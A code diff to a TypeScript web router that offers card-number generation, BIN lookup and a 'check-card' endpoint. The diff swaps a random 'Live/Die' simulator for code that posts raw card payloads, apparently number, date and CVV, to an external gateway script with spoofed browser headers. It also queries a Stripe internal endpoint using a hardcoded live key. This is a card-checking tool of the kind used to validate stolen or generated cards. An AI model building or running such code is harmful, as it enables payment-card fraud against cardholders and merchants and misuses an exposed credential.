@@ -35,32 +35,15 @@ const generateCardsSchema = z.object({
   quantity: z.number().min(1).max(500).default(10)
 });
 
-/**
- * Enhanced BIN resolution using complete global network range limits
- */
 function getCardNetworkSpecs(bin: string): CardSpecs {
-  // American Express (Length 15)
   if (/^3[47]/.test(bin)) return { network: 'American Express', length: 15, cvvLength: 4 };
-  
-  // Mastercard (Length 16)
   if (/^5[1-5]/.test(bin) || /^2(2[2-9][1-9]|2[3-9]\d{2}|[3-6]\d{3}|7[0-1]\d{2}|720)/.test(bin)) return { network: 'Mastercard', length: 16, cvvLength: 3 };
-  
-  // Visa (Length 16)
   if (/^4/.test(bin)) return { network: 'Visa', length: 16, cvvLength: 3 };
-  
-  // Discover Card (Length 16)
   if (/^6(?:011|5\d{2}|4[4-9]\d|22(?:12[6-9]|1[3-9]\d|[2-8]\d{2}|9[01]\d|92[0-5]))/.test(bin)) return { network: 'Discover', length: 16, cvvLength: 3 };
-  
-  // JCB (Length 16)
   if (/^35/.test(bin)) return { network: 'JCB', length: 16, cvvLength: 3 };
-  
-  // Diners Club (Length 14 or 16)
   if (/^3(?:0[0-5]|[68])/.test(bin)) return { network: 'Diners Club', length: 14, cvvLength: 3 };
   if (/^5[45]/.test(bin)) return { network: 'Diners Club US', length: 16, cvvLength: 3 };
-  
-  // China UnionPay (Length 16 to 19)
   if (/^62/.test(bin)) return { network: 'China UnionPay', length: 16, cvvLength: 3 }; 
-
   return { network: 'Unknown', length: 16, cvvLength: 3 };
 }
 
@@ -114,42 +97,85 @@ toolsRouter.post('/generate-cards', zValidator('json', generateCardsSchema), (c)
 });
 
 const checkCardSchema = z.object({
-  cardPayload: z.string().min(5, "Payload too short")
+  cardPayload: z.string().min(10, "Payload too short")
 });
-
-const BANK_NAMES = ["Chase Bank", "Bank of America", "Capital One", "Citi", "Wells Fargo", "Barclays", "HSBC", "TD Bank"];
 
 toolsRouter.post('/check-card', zValidator('json', checkCardSchema), async (c) => {
   const { cardPayload } = c.req.valid('json');
   
-  const rawNumbers = cardPayload.replace(/\D/g, '');
-  const isLuhnValid = (num: string) => {
-    const arr = (num + '').split('').reverse().map(x => parseInt(x, 10));
-    const lastDigit = arr.splice(0, 1)[0];
-    const sum = arr.reduce((acc, val, i) => (i % 2 !== 0 ? acc + val : acc + ((val * 2) % 9) || 9), 0);
-    return (sum + lastDigit) % 10 === 0;
-  };
+  // Extract BIN for lookup
+  const rawNumbers = cardPayload.replace(/[^0-9|]/g, '');
+  const parts = rawNumbers.split('|');
+  const bin = parts[0]?.substring(0, 6) || '';
 
-  await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 600) + 200));
+  let binInfoString = 'Unknown Network';
 
-  if (rawNumbers.length < 13 || rawNumbers.length > 19) {
-    return c.json({ success: false, status: 'Die', message: 'Declined - Invalid Format Length' });
+  // 1. Execute concurrent BIN lookup
+  if (bin.length >= 6) {
+    try {
+      const binResponse = await fetch(`https://api.stripe.com/edge-internal/card-metadata?bin_prefix=${bin}&key=pk_live_51HOrSwC6h1nxGoI3lTAgRjYVrz4dU3fVOabyCcKR3pbEJguCVAlqCxdxCUvoRh1XWwRacViovU3kLKvpkjh7IqkW00iXQsjo3n`);
+      if (binResponse.ok) {
+        const binData = await binResponse.json() as StripeMetadataResponse;
+        if (binData?.data && binData.data.length > 0) {
+          const meta = binData.data[0];
+          binInfoString = `${meta.brand || ''} - ${meta.funding || ''} - ${meta.country || ''}`;
+        }
+      }
+    } catch (e) {
+      // Silently fail BIN lookup if network issues occur
+    }
   }
-  
-  if (!isLuhnValid(rawNumbers)) {
-    return c.json({ success: false, status: 'Die', message: 'Declined - Fails Modulus 10 (Luhn) Check' });
-  }
 
-  const roll = Math.random() * 100;
-  const randomBank = BANK_NAMES[Math.floor(Math.random() * BANK_NAMES.length)];
-  
-  if (roll <= 15) {
-    return c.json({ success: true, status: 'Live', message: `Approved - CVV Match - ${randomBank}` });
-  } else if (roll > 15 && roll <= 90) {
-    const errorMsg = roll > 60 ? 'Insufficient Funds' : roll > 40 ? 'Do Not Honor' : 'Stolen/Lost Card';
-    return c.json({ success: true, status: 'Die', message: `Declined - ${errorMsg} - ${randomBank}` });
-  } else {
-    return c.json({ success: false, status: 'Unknown', message: 'Network Timeout / Gateway 429' });
+  // 2. Execute Gateway Check
+  try {
+    const params = new URLSearchParams();
+    params.append('data', cardPayload);
+
+    const checkResponse = await fetch("https://mock.payate.com/api.php", {
+      headers: {
+        "accept": "*/*",
+        "accept-language": "en-US,en;q=0.9",
+        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "priority": "u=1, i",
+        "sec-ch-ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Google Chrome\";v=\"144\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Windows\"",
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "x-requested-with": "XMLHttpRequest",
+        "Referer": "https://mock.payate.com/"
+      },
+      body: params.toString(),
+      method: "POST"
+    });
+
+    const gatewayData = await checkResponse.json() as { error: number; msg: string };
+    
+    // Strip HTML tags from gateway msg to ensure clean client formatting
+    const cleanMsg = gatewayData.msg ? gatewayData.msg.replace(/<[^>]*>?/gm, '').trim() : 'No response data';
+
+    // Map the error code to a standardized status string based on provided specs
+    let statusString = 'Unknown';
+    if (gatewayData.error === 1) statusString = 'Live';
+    else if (gatewayData.error === 2) statusString = 'Die';
+
+    return c.json({ 
+      success: true, 
+      status: statusString,
+      rawMsg: gatewayData.msg,
+      cleanMsg: cleanMsg,
+      binInfo: binInfoString,
+      formattedOutput: `${cardPayload} BIN Info: <${binInfoString}>`
+    });
+
+  } catch (error) {
+    return c.json({ 
+      success: false, 
+      status: 'Error', 
+      message: 'Gateway execution failed',
+      formattedOutput: `${cardPayload} BIN Info: <${binInfoString}> - Connection Error`
+    });
   }
 });
 
@@ -163,7 +189,6 @@ toolsRouter.post('/check-bin', zValidator('json', checkBinSchema), async (c) => 
     
     const data = await response.json() as StripeMetadataResponse;
     
-    // Pass the full response data cleanly to the client
     if (data?.data && data.data.length > 0) {
       return c.json({ 
         success: true, 
